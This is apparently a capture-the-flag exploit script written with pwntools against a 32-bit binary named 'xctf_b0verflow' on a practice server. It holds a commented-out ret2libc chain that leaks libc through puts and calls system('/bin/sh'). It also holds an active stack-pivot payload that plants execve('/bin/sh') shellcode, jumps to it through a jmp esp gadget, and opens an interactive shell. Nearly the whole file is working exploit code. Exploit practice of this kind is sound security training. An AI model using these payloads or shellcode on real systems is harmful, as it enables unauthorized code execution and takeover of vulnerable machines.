#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()

if(sys.argv[1] == 'l'):
	p = process("./xctf_b0verflow")
	elf = ELF("./xctf_b0verflow",checksec=False)
else:
	p = remote('node3.buuoj.cn',27996)
	elf = ELF("./xctf_b0verflow",checksec=False)
'''
###ret2libc###
puts_got = elf.got['puts']
puts_plt = elf.symbols['puts']
vuln = elf.symbols['vul']


payload = 'A' * 36 + p32(puts_plt) + p32(vuln) + p32(puts_got)
sla("What's your name?\n",payload)

puts = u32(ru('\xf7')[-4:].ljust(4,'\x00'))
libc = LibcSearcher('puts',puts)
libc_base = puts - libc.dump('puts')
success(hex(libc_base))

system = libc_base+libc.dump('system')
sh = libc_base + libc.dump('str_bin_sh')

payload = 'A' * 36 + p32(system) + 'dead' + p32(sh)
sla("What's your name?\n",payload)

ia()
'''

###stack pivot###
jmp_esp = 0x8048504
sub_esp_jmp = asm("sub esp,0x28;jmp esp")
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"

payload = shellcode
payload+= 'A' * (0x24 - len(shellcode)) 
payload+= p32(jmp_esp)
payload+= sub_esp_jmp
sla("What's your name?\n",payload)

ia()